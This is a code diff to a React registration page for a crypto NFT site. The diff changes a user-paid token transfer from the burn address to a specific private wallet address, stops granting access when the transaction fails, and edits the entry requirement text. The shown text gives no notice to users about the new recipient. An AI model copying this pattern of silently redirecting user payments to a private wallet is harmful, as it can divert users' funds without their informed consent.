@@ -44,7 +44,7 @@ const RegisterToWinPage = (allow) => {
       
 
       await NaughtyContract.methods
-        .transfer('0x000000000000000000000000000000000000dead', 69000000000)
+        .transfer('0xac2C913Cac37D0f3B9335AFf22127A8b006810B8', 69000000000)
         .send({ from: account })
         .on('sending', () => {
           setIsLoading(true)
@@ -56,17 +56,17 @@ const RegisterToWinPage = (allow) => {
           console.error(error)
           setError('Unable to send Tx')
           setIsLoading(false)
-          setAccepted(true)
+          
         })
     } catch (err) {
       console.error('Unable to send Tx', err)
-      setAccepted(true)
+      
     }
   }
 
   let show
    if(accepted && account ){
-     show =<StyledHero><NftInfo /> <NftList /> <HowItWorks /></StyledHero>
+     show =<StyledHero> <NftList /> <HowItWorks /></StyledHero>
    }
    else{
     show =   <Container>
@@ -75,7 +75,7 @@ const RegisterToWinPage = (allow) => {
         NFTs
       </Heading>
       <Heading as="h2" size="lg" color="secondary" mb="16px">
-        You must hold at least 69 000 Flix to enter the Naughty Area
+        You must hold at least 69 Naughty to enter the Naughty Area
       </Heading>
       <Text mb="24px"> If you can not wait to use your Naughty to farm Flix for free you can gain access here: </Text>
       <Cta>
